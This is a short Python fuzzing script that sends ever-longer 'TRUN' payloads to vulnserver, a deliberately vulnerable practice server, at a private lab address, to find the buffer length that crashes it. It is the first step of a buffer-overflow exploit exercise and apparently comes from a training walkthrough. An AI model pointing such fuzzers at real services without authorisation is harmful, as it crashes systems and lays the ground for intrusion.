#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        # We declare the payload at this point.
        payload = "TRUN /.:/" + buffer

        # Establish a stream from our machine and initiate a connection to vulnserver 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Change this to your Windows machine IP.
        s.connect(('192.168.0.67',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    # This is what happens upon program termination
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()